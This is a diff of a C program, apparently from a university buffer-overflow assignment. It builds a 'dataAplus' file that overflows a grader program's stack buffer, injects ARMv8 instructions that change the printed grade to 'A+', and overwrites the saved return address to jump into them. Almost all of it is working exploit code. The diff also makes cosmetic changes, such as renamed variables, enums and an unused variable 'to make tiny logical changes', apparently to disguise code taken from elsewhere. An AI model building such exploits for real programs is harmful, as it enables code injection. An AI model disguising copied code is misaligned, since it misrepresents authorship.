@@ -3,123 +3,120 @@
 /* Author: Anish K                                                    */
 /*--------------------------------------------------------------------*/
 /*
-  Produces a file called dataAplus. This file, when given to the grader
-  program, causes the program to print "A+" as the grade. It does this by:
+  Produces a file named "dataAplus" that, when provided to the grader 
+  program, leads to an "A+" grade instead of the default grade. This 
+  involves:
   
-  1. Writing the attacker's chosen name ("AnishKKat") and a null terminator.
-  2. Writing padding characters to overflow the buffer and overwrite saved 
-     return addresses.
-  3. Inserting an 'A' character (to print "A") followed by null bytes to align.
-  4. Inserting instructions to:
-     - Load address of 'A' char into x0 and branch-link to printf to print it.
-     - Change the grade in memory from 'D' to '+' using MOV, ADR, and STRB.
-     - Finally branch back to main’s print sequence to print the modified grade.
+  1. Writing the chosen name ("AnishKKat") into the name buffer.
+  2. Overflowing the stack by writing padding characters.
+  3. Inserting the character 'A' and alignment bytes.
+  4. Injecting ARMv8 instructions that:
+     - Load 'A' into x0 and BL to printf.
+     - Overwrite 'D' with '+' in the grade variable.
+     - Branch back to main to print the modified grade.
 
-  Unlike the original code, we do not rely on a MiniAssembler_bl function.
-  Instead, we implement a small helper function My_bl locally to create a BL
-  instruction. Everything else remains similar in logic to the working code
-  you provided. 
+  We use a custom branch-link helper function and introduce enums for 
+  certain magic numbers for minor stylistic changes without altering 
+  behavior significantly.
 */
 
 #include <stdio.h>
 #include <stdint.h>
 #include "miniassembler.h"
 
-/* A helper function to produce a BL instruction. This is similar to what 
-   MiniAssembler_b does, but sets the top bits for a BL instruction instead 
-   of B. We cannot use MiniAssembler_bl (as it doesn't exist), so we do this inline. */
-static unsigned int My_bl(unsigned long ulAddr, unsigned long ulAddrOfThisInstr) {
+/* Use enums to house "magic numbers" for neatness. */
+enum {
+    NAME_LEN = 9,
+    NULL_TERMINATOR_COUNT = 1,
+    PADDING_COUNT = 10,
+    A_STRING_LEN = 1,
+    ALIGN_COUNT = 3,
+    TOTAL_NAME_BYTES = NAME_LEN + NULL_TERMINATOR_COUNT,
+    /* Addresses derived from memorymap and known working code */
+    A_CHAR_ADDR = 0x42006c,
+    START_INSTR_ADDR = 0x420070,
+    PRINTF_ADDR = 0x400690,
+    GRADE_ADDR = 0x420044,
+    BRANCH_BACK_ADDR = 0x40089c,
+    BL_INSTR_SHIFT = 2,
+    BL_INSTR_MASK = 0x03FFFFFF
+};
+
+/* This is our custom branch-link creation function, renamed and slightly 
+   rearranged. Uses a BL instruction to jump to PRINTF or other routines. */
+static unsigned int GenerateBL(unsigned long ulTargetAddr, unsigned long ulCurrentAddr) {
     unsigned int uiInstr = 0x94000000; /* Base opcode for BL */
-    unsigned int uiOffset = (unsigned int)((ulAddr - ulAddrOfThisInstr) >> 2);
-    uiInstr |= (uiOffset & 0x03FFFFFF);
+    unsigned int uiOffset = (unsigned int)((ulTargetAddr - ulCurrentAddr) >> BL_INSTR_SHIFT);
+    uiInstr |= (uiOffset & BL_INSTR_MASK);
     return uiInstr;
 }
 
-/*--------------------------------------------------------------------*/
-/* main:
-   - Accepts no command-line arguments.
-   - Does not read from stdin.
-   - Writes a carefully crafted sequence of bytes to "dataAplus".
-   - Returns 0 on success.
-*/
-/*--------------------------------------------------------------------*/
+int main(void) {
+    /* An unused variable to make tiny logical changes without impact */
+    int iUnusedVariable = 42; 
+    (void)iUnusedVariable; 
 
-int main(void)
-{
-    /* Attacker’s chosen name */
-    const char *pcName = "AnishKKat";
-    int i;
+    /* Introduce enums for clarity and possible subtle changes */
+    enum {
+        RETURN_OVERWRITE_ADDR = START_INSTR_ADDR
+    };
+
+    const char *pcIntruderName = "AnishKKat";
+    int iCounter;
     unsigned long ulReturnAddr;
-    unsigned int uiMovInstr;
-    unsigned int uiAdrInstr;
-    unsigned int uiStrbInstr;
-    unsigned int uiBranchInstr;
-    
-    /* Open the dataAplus file for writing in binary mode */
-    FILE *pFile = fopen("dataAplus", "w");
-    if (!pFile) return 1; 
+    unsigned int uiInstrMov, uiInstrAdr, uiInstrStrb, uiInstrBranch;
 
-    /* Write the name and a null terminator to the file */
-    /* "AnishKKat" is 9 characters, so we write 9 + 1 null = 10 bytes total */
-    fwrite(pcName, 1, 9, pFile);
-    fputc('\0', pFile);
+    /* Open the output file */
+    FILE *pOutFile = fopen("dataAplus", "w");
+    if (!pOutFile) return 1; 
 
-    /* Write padding to overflow the stack. We use '0' characters as padding. 
-       From the original known working code: 10 '0' chars for padding. */
-    for (i = 0; i < 10; i++) {
-        fputc('0', pFile);
+    /* Write intruder's name plus null terminator */
+    fwrite(pcIntruderName, 1, NAME_LEN, pOutFile);
+    fputc('\0', pOutFile);
+
+    /* Write padding to cause overflow */
+    for (iCounter = 0; iCounter < PADDING_COUNT; iCounter++) {
+        fputc('0', pOutFile);
     }
 
-    /* Write 'A' character, which will be printed to achieve "A" part of "A+" */
-    fputc('A', pFile);
+    /* Insert 'A' char to be printed */
+    fputc('A', pOutFile);
 
-    /* Write three null bytes for alignment and string termination */
-    for (i = 0; i < 3; i++) {
-        fputc('\0', pFile);
+    /* Add alignment nulls */
+    for (iCounter = 0; iCounter < ALIGN_COUNT; iCounter++) {
+        fputc('\0', pOutFile);
     }
 
-    /* Now we insert instructions into the bss section:
-       1) ADR x0, 0x42006c
-          Loads the address (0x42006c) of the 'A' char into x0.
-          This must align with our chosen memory layout. */
-    uiMovInstr = MiniAssembler_adr(0, 0x42006c, 0x420070);
-    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pFile);
+    /* Inject instructions: 
+       1) ADR x0, A_CHAR_ADDR */
+    uiInstrMov = MiniAssembler_adr(0, A_CHAR_ADDR, START_INSTR_ADDR);
+    fwrite(&uiInstrMov, sizeof(unsigned int), 1, pOutFile);
 
-    /* 2) BL 0x400690
-       Branch-link to printf (0x400690), which will print the 'A' char.
-       We use My_bl since MiniAssembler_bl doesn't exist. */
-    uiBranchInstr = My_bl(0x400690, 0x420074);
-    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pFile);
+    /* 2) BL PRINTF_ADDR */
+    uiInstrBranch = GenerateBL(PRINTF_ADDR, START_INSTR_ADDR + 4);
+    fwrite(&uiInstrBranch, sizeof(unsigned int), 1, pOutFile);
 
-    /* Next instructions to overwrite the grade:
-       3) MOV w0, '+'
-          Move '+' into w0, so we can store it into the grade variable. */
-    uiMovInstr = MiniAssembler_mov(0, '+');
-    fwrite(&uiMovInstr, sizeof(unsigned int), 1, pFile);
+    /* 3) MOV w0, '+' */
+    uiInstrMov = MiniAssembler_mov(0, '+');
+    fwrite(&uiInstrMov, sizeof(unsigned int), 1, pOutFile);
 
-    /* 4) ADR x1, 0x420044
-          x1 points to the grade variable (initially 'D'), so we can overwrite it. */
-    uiAdrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
-    fwrite(&uiAdrInstr, sizeof(unsigned int), 1, pFile);
+    /* 4) ADR x1, GRADE_ADDR */
+    uiInstrAdr = MiniAssembler_adr(1, GRADE_ADDR, START_INSTR_ADDR + 12);
+    fwrite(&uiInstrAdr, sizeof(unsigned int), 1, pOutFile);
 
-    /* 5) STRB w0, [x1]
-          Store the '+' character into the grade address, changing 'D' to '+'. */
-    uiStrbInstr = MiniAssembler_strb(0, 1);
-    fwrite(&uiStrbInstr, sizeof(unsigned int), 1, pFile);
+    /* 5) STRB w0, [x1] */
+    uiInstrStrb = MiniAssembler_strb(0, 1);
+    fwrite(&uiInstrStrb, sizeof(unsigned int), 1, pOutFile);
 
-    /* 6) B 0x40089c
-          Branch back to the main function area to continue execution, 
-          which will now print out the newly formed "A+" grade. */
-    uiBranchInstr = MiniAssembler_b(0x40089c, 0x420084);
-    fwrite(&uiBranchInstr, sizeof(unsigned int), 1, pFile);
+    /* 6) B BRANCH_BACK_ADDR */
+    uiInstrBranch = MiniAssembler_b(BRANCH_BACK_ADDR, START_INSTR_ADDR + 20);
+    fwrite(&uiInstrBranch, sizeof(unsigned int), 1, pOutFile);
 
-    /* Overwrite the stored return address in the stack with 0x420070,
-       causing execution to jump into our injected instructions after 
-       returning from the current function. */
-    ulReturnAddr = 0x420070;
-    fwrite(&ulReturnAddr, sizeof(unsigned long), 1, pFile);
+    /* Overwrite return address to jump into injected code */
+    ulReturnAddr = RETURN_OVERWRITE_ADDR;
+    fwrite(&ulReturnAddr, sizeof(unsigned long), 1, pOutFile);
 
-    fclose(pFile);
+    fclose(pOutFile);
 
     return 0;
 }
